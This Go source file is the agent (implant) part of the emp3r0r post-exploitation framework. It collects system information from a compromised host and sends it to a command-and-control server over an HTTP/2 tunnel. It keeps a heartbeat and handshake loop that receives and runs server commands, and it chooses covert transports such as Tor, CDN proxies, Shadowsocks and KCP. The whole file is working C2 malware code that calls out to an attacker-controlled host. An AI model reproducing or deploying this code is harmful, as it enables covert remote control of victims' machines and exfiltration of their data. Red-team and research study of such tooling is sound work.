package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// CheckIn poll CC server and report its system info
func CheckIn() (err error) {
	info := CollectSystemInfo()
	checkin_URL := emp3r0r_data.CCAddress + tun.CheckInAPI + "/" + uuid.NewString()
	log.Printf("Collected system info, now checking in (%s)", checkin_URL)

	conn, _, _, err := ConnectCC(checkin_URL)
	if err != nil {
		return err
	}
	defer conn.Close()
	out := json.NewEncoder(conn)
	err = out.Encode(info)
	if err == nil {
		log.Println("Checked in")
	}
	return err
}

// IsCCOnline check RuntimeConfig.CCIndicator
func IsCCOnline(proxy string) bool {
	t := &http.Transport{
		Dial: (&net.Dialer{
			Timeout:   60 * time.Second,
			KeepAlive: 30 * time.Second,
		}).Dial,
		TLSHandshakeTimeout: 60 * time.Second,
	}
	if proxy != "" && strings.HasPrefix(emp3r0r_data.Transport, "HTTP2") {
		proxyUrl, err := url.Parse(proxy)
		if err != nil {
			log.Fatalf("Invalid proxy: %v", err)
		}
		t.Proxy = http.ProxyURL(proxyUrl)
		log.Printf("IsCCOnline: using proxy %s", proxy)
	}
	client := http.Client{
		Transport: t,
		Timeout:   30 * time.Second,
	}
	resp, err := client.Get(RuntimeConfig.CCIndicator)
	if err != nil {
		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicator, err)
		return false
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicator, err)
		return false
	}
	defer resp.Body.Close()

	log.Printf("Checking CCIndicator (%s) for %s", RuntimeConfig.CCIndicator, strconv.Quote(RuntimeConfig.CCIndicatorText))
	return strings.Contains(string(data), RuntimeConfig.CCIndicatorText)
}

func catchInterruptAndExit(cancel context.CancelFunc) {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	<-sig
	log.Println("Cancelling due to interrupt")
	cancel()
	os.Exit(0)
}

// ConnectCC connect to CC with h2conn
func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel context.CancelFunc, err error) {
	var resp *http.Response
	defer func() {
		if conn == nil {
			err = fmt.Errorf("ConnectCC at %s failed", url)
			cancel()
		}
	}()

	// use h2conn for duplex tunnel
	ctx, cancel = context.WithCancel(context.Background())

	h2 := h2conn.Client{
		Client: emp3r0r_data.HTTPClient,
		Header: http.Header{
			"AgentUUID":    {RuntimeConfig.AgentUUID},
			"AgentUUIDSig": {RuntimeConfig.AgentUUIDSig},
		},
	}
	log.Printf("ConnectCC: connecting to %s", url)
	go func() {
		conn, resp, err = h2.Connect(ctx, url)
		if err != nil {
			err = fmt.Errorf("ConnectCC: initiate h2 conn: %s", err)
			log.Print(err)
			cancel()
		}
		// Check server status code
		if resp != nil {
			if resp.StatusCode != http.StatusOK {
				err = fmt.Errorf("Bad status code: %d", resp.StatusCode)
				return
			}
		}
	}()

	// kill connection on timeout
	countdown := 10
	for conn == nil && countdown > 0 {
		countdown--
		time.Sleep(time.Second)
	}

	return
}

// HandShakes record each hello message and C2's reply
var (
	HandShakes      = make(map[string]bool)
	HandShakesMutex = &sync.RWMutex{}
)

// CCMsgTun use the connection (CCConn)
func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
	var (
		in  = json.NewDecoder(emp3r0r_data.CCMsgConn)
		out = json.NewEncoder(emp3r0r_data.CCMsgConn)
		msg emp3r0r_data.MsgTunData // data being exchanged in the tunnel
	)
	go catchInterruptAndExit(cancel)
	defer func() {
		err = emp3r0r_data.CCMsgConn.Close()
		if err != nil {
			log.Print("CCMsgTun closing: ", err)
		}

		cancel()
		emp3r0r_data.KCPKeep = false // tell KCPClient to close this conn so we won't stuck
		log.Print("CCMsgTun closed")
	}()

	// check for CC server's response
	go func() {
		log.Println("Check CC response: started")
		defer cancel()
		for ctx.Err() == nil {
			// read response
			err = in.Decode(&msg)
			if err != nil {
				log.Print("Check CC response: JSON msg decode: ", err)
				break
			}
			payload := msg.Payload
			if strings.HasPrefix(payload, "hello") {
				log.Printf("Hello (%s) received", payload)
				// mark the hello as success
				for hello := range HandShakes {
					if strings.HasPrefix(payload, hello) {
						log.Printf("Hello (%s) acknowledged", payload)
						HandShakesMutex.Lock()
						HandShakes[hello] = true
						HandShakesMutex.Unlock()
						break
					}
				}
				continue
			}

			// process CC data
			go processCCData(&msg)
		}
		log.Println("Check CC response: exited")
	}()

	wait_hello := func(hello string) bool {
		// delete key, forget about this hello when we are done
		defer func() {
			HandShakesMutex.Lock()
			delete(HandShakes, hello)
			HandShakesMutex.Unlock()
		}()
		// wait until timeout or success
		for i := 0; i < RuntimeConfig.Timeout; i++ {
			// if hello marked as success, return true
			HandShakesMutex.RLock()
			isSuccess := HandShakes[hello]
			HandShakesMutex.RUnlock()
			if isSuccess {
				log.Printf("Hello (%s) done", hello)
				return true
			}
			time.Sleep(time.Millisecond)
		}
		log.Printf("Hello (%s) timeout", hello)
		return false
	}

	sendHello := func(cnt int) bool {
		var hello_msg emp3r0r_data.MsgTunData
		// try cnt times then exit
		for cnt > 0 {
			cnt-- // consume cnt

			// send hello
			hello_msg.Payload = "hello" + util.RandStr(util.RandInt(1, 100))
			hello_msg.Tag = RuntimeConfig.AgentTag
			err = out.Encode(hello_msg)
			if err != nil {
				log.Printf("agent cannot connect to cc: %v", err)
				util.TakeABlink()
				continue
			}
			HandShakesMutex.Lock()
			HandShakes[hello_msg.Payload] = false
			HandShakesMutex.Unlock()
			log.Printf("Hello (%s) sent", hello_msg.Payload)
			if !wait_hello(hello_msg.Payload) {
				cancel()
				break
			}
			return true
		}
		return false
	}

	// keep connected
	for ctx.Err() == nil {
		log.Println("Hearbeat begins")
		if !sendHello(util.RandInt(1, 10)) {
			log.Print("sendHello failed")
			break
		}
		err = CheckIn()
		if err != nil {
			log.Printf("Updating agent sysinfo: %v", err)
		}
		if !util.IsExist(RuntimeConfig.UtilsPath + "/python") {
			if runtime.GOOS == "linux" {
				go VaccineHandler()
			}
		}
		log.Println("Hearbeat ends")
		util.TakeASnap()
	}

	return fmt.Errorf("CCMsgTun closed: %v", ctx.Err())
}

// set C2Transport
func setC2Transport() {
	if tun.IsTor(emp3r0r_data.CCAddress) {
		emp3r0r_data.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_data.CCAddress)
		return
	} else if RuntimeConfig.CDNProxy != "" {
		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", RuntimeConfig.CDNProxy)
		return
	} else if RuntimeConfig.UseShadowsocks {
		emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) to %s",
			RuntimeConfig.ShadowsocksPort, emp3r0r_data.CCAddress)
		// ss thru KCP
		if RuntimeConfig.UseKCP {
			emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) in KCP (*:%s) to %s",
				RuntimeConfig.ShadowsocksPort, RuntimeConfig.KCPPort, emp3r0r_data.CCAddress)
		}
	} else {
		emp3r0r_data.Transport = fmt.Sprintf("HTTP2 (%s)", emp3r0r_data.CCAddress)
	}
}
